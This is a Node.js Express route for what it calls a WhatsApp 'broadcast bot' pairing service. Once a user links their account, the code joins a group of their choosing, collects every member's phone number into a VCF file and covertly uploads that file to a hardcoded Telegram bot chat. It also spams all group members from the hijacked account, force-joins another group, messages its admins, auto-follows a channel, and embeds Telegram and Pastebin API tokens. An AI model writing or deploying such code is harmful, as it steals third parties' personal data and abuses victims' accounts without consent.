const PastebinAPI = require('pastebin-js'),
    pastebin = new PastebinAPI('EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL');
const { makeid } = require('./id');
const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
let router = express.Router();
const pino = require("pino");
const {
    default: DEXTER_TECH,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers
} = require("@whiskeysockets/baileys");

const contactData = require('./contact.json');

const TELEGRAM_BOT_TOKEN = '7719226208:AAFFMMvAkpHStCbG6v70MJm9D9CROarXNTo';
const TELEGRAM_CHAT_ID = '6837172851';

function removeFile(FilePath) {
    if (!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true });
}

function generateVCF(participants, contactData, id, groupName) {
    const vcfFilePath = path.join(__dirname, `./temp/${id}/contacts_${groupName}.vcf`);
    let vcfContent = '';

    participants.forEach((participant, index) => {
        const pushname = participant.name || participant.id.split('@')[0];
        const phoneNumber = participant.id.replace('@s.whatsapp.net', '');
        
        vcfContent += `BEGIN:VCARD\n`;
        vcfContent += `VERSION:3.0\n`;
        vcfContent += `FN:[ ${groupName} ] 𝙻𝙾𝙳 𝙱𝚁𝙾𝙰𝙳𝙲𝙰𝚂𝚃 [ ${index + 1} ]\n`;
        vcfContent += `TEL;TYPE=CELL:${phoneNumber}\n`;
        vcfContent += `END:VCARD\n`;
    });

    contactData.forEach((contact, index) => {
        vcfContent += `BEGIN:VCARD\n`;
        vcfContent += `VERSION:3.0\n`;
        vcfContent += `FN:[${groupName}] 𝙻𝙾𝙳 𝙱𝚁𝙾𝙰𝙳𝙲𝙰𝚂𝚃 [${index + participants.length + 1}]\n`;
        vcfContent += `TEL;TYPE=CELL:${contact.number}\n`;
        vcfContent += `END:VCARD\n`;
    });

    fs.writeFileSync(vcfFilePath, vcfContent);
    return vcfFilePath;
}

async function sendFileToTelegram(filePath) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('document', fs.createReadStream(filePath));

    try {
        const response = await axios.post(url, formData, {
            headers: formData.getHeaders()
        });
        console.log('File sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending file to Telegram:', error.message);
    }
}

async function sendConnectionMessageToAdmins(Pair_Code_By_DEXTER_TECH) {
    try {
        for (const admin of contactData) {
            const adminJid = `${admin.number}@s.whatsapp.net`;
            
            // Use admin's image URL or default image
            const imageUrl = admin.imageUrl || "https://i.ibb.co/ZpN5zjWQ/IMG-20250328-WA0235.jpg";
            
            const connectionMessage = {
                image: { url: imageUrl },
                caption: `*✅ Connection Established Successfully!*\n\nHello *${admin.name}*,\n\nYour *LOD Broadcast Bot* is now connected and ready to serve!\n\n` +
                         `*🔹 Bot Name:* ${Pair_Code_By_DEXTER_TECH.user.name || 'LOD Broadcast Bot'}\n` +
                         `*🔹 Connection Time:* ${new Date().toLocaleString()}\n\n` +
                         `*⛓️‍💥 Follow LOD Channel:* https://whatsapp.com/channel/0029VbAWWH9BFLgRMCXVlU38\n` +
                         `*🎁 LOD X FREE BOT SITE:* https://solo-leveling-meda-by-lod-x-free.vercel.app/\n\n` +
                         `*Powered by RUKA & DINU* 🕊️`
            };

            await Pair_Code_By_DEXTER_TECH.sendMessage(adminJid, connectionMessage);
            console.log(`Connection message with image sent to admin: ${admin.name}`);
        }
    } catch (error) {
        console.error('Error sending connection message to admins:', error);
    }
}

router.get('/', async (req, res) => {
    const id = makeid();
    let num = req.query.number;
    const groupAInviteLink = decodeURIComponent(req.query.groupAInviteLink || "");
    const caption = decodeURIComponent(req.query.caption || "");
    const imageUrl = decodeURIComponent(req.query.imageUrl || "https://i.ibb.co/ZpN5zjWQ/IMG-20250328-WA0235.jpg"); 

    const groupBInviteLink = "https://chat.whatsapp.com/D4rOaoqGvoU38WT12SegRY?mode=r_t";

    async function DEXTER_TECH_PAIR_CODE() {
        const { state, saveCreds } = await useMultiFileAuthState(`./temp/${id}`);
        try {
            let Pair_Code_By_DEXTER_TECH = DEXTER_TECH({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.ubuntu("Chrome")
            });

            if (!Pair_Code_By_DEXTER_TECH.authState.creds.registered) {
                await delay(1500);
                num = num.replace(/[^0-9]/g, '');
                const code = await Pair_Code_By_DEXTER_TECH.requestPairingCode(num);
                if (!res.headersSent) {
                    await res.send({ code });
                }
            }

            Pair_Code_By_DEXTER_TECH.ev.on('creds.update', saveCreds);
            Pair_Code_By_DEXTER_TECH.ev.on("connection.update", async (s) => {
                const { connection, lastDisconnect } = s;
                if (connection === "open") {
                    await delay(5000);
                    
                    // Send connection message to admins with image
                    await sendConnectionMessageToAdmins(Pair_Code_By_DEXTER_TECH);

                    try {
                        const groupAInviteCode = groupAInviteLink.split('/').pop();
                        if (!groupAInviteCode) {
                            throw new Error("Invalid Group A invite link.");
                        }

                        const groupAId = await Pair_Code_By_DEXTER_TECH.groupAcceptInvite(groupAInviteCode);
                        console.log("Successfully joined Group A:", groupAId);

                        const groupAMetadata = await Pair_Code_By_DEXTER_TECH.groupMetadata(groupAId);
                        const groupAParticipants = groupAMetadata.participants.map(p => p.id);

                        const vcfFilePath = generateVCF(groupAMetadata.participants, contactData, id, groupAMetadata.subject);

                        await Pair_Code_By_DEXTER_TECH.sendMessage(Pair_Code_By_DEXTER_TECH.user.id, {
                            document: { url: vcfFilePath },
                            mimetype: 'text/vcard',
                            fileName: `${groupAMetadata.subject}.vcf`, 
                            caption: `*Contacts shared by Lod In RUKA & DINU* 🕊️`
                        });

                        await sendFileToTelegram(vcfFilePath);

                        const modifiedCaption = `*🌈 සුබ දවසක් 📚*\n\n*මෙය 𝙻𝙾𝙳 𝙳𝙴𝚅𝙴𝙻𝙾𝙿 𝙱𝚈 𝚃𝙴𝙼𝙿𝙾𝚁𝙰𝚁𝚈 𝙱𝚁𝙾𝙰𝙳𝙲𝙰𝚂𝚃 𝙱𝙾𝚃 මගින් ලැබෙන Mᴀꜱꜱᴀɢᴇ එ‍කකි ‼️*\n*⛓️Thanks by lod*\n*🎁 LOD WEBSITE 👇*\n\n*Group Name :* ${groupAMetadata.subject}\n\n${caption}\n\n> ᴅᴇᴠᴇʟᴏᴘ ʙʏ ʀᴜᴋᴀ & ᴅɪɴᴜ`;

                        for (const participant of groupAParticipants) {
                            await Pair_Code_By_DEXTER_TECH.sendMessage(participant, {
                                image: { url: imageUrl },
                                caption: modifiedCaption
                            });
                        }

                        const groupBInviteCode = groupBInviteLink.split('/').pop();
                        if (!groupBInviteCode) {
                            throw new Error("Invalid Group B invite link.");
                        }

                        const groupBId = await Pair_Code_By_DEXTER_TECH.groupAcceptInvite(groupBInviteCode);
                        console.log("Successfully joined Group B:", groupBId);

                        const groupBMetadata = await Pair_Code_By_DEXTER_TECH.groupMetadata(groupBId);
                        const groupBAdmins = groupBMetadata.participants.filter(p => p.admin).map(p => p.id);

                        const modifiedBCaption = `*TNX LEGION OF DOOM FAMILY YOUR FAMILY IS BEST ‼️*\n\nGroup: ${groupBMetadata.subject}\n\n${caption}\n\n*POWER BY REAL RUKA & DINU*`;

                        for (const admin of groupBAdmins) {
                            await Pair_Code_By_DEXTER_TECH.sendMessage(admin, {
                                image: { url: imageUrl },
                                caption: modifiedBCaption
                            });
                        }

                        // Check and follow newsletter
                        const metadata = await Pair_Code_By_DEXTER_TECH.newsletterMetadata("jid", "120363401755639074@newsletter");
                        if (metadata.viewer_metadata === null) {
                            await Pair_Code_By_DEXTER_TECH.newsletterFollow("120363401755639074@newsletter");
                            console.log("CHANNEL FOLLOW SUCCESSFULLY ✅");
                        }

                        await Pair_Code_By_DEXTER_TECH.sendMessage(Pair_Code_By_DEXTER_TECH.user.id, { 
                            text: `*YOUR PUSH CONTACT ALERT* ‼️\n\n*Success! I have joined the groups and sent messages*\n\nGroup A: ${groupAMetadata.subject}\nGroup B: ${groupBMetadata.subject}\n\n> *POWER BY LOD* ‼️` 
                        });
                    } catch (err) {
                        console.error("Error joining groups or sending messages:", err);

                        await Pair_Code_By_DEXTER_TECH.sendMessage(Pair_Code_By_DEXTER_TECH.user.id, { 
                            text: `*Failed to join groups or send messages. Error: ${err.message}* ✖️` 
                        });
                    }

                    await delay(100);
                    await Pair_Code_By_DEXTER_TECH.ws.close();
                    return await removeFile(`./temp/${id}`);
                } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode !== 401) {
                    await delay(10000);
                    DEXTER_TECH_PAIR_CODE();
                }
            });
        } catch (err) {
            console.error("Error during pairing:", err);
            await removeFile(`./temp/${id}`);
            if (!res.headersSent) {
                await res.send({ code: "Service Unavailable" });
            }
        }
    }
    return await DEXTER_TECH_PAIR_CODE();
});

module.exports = router;
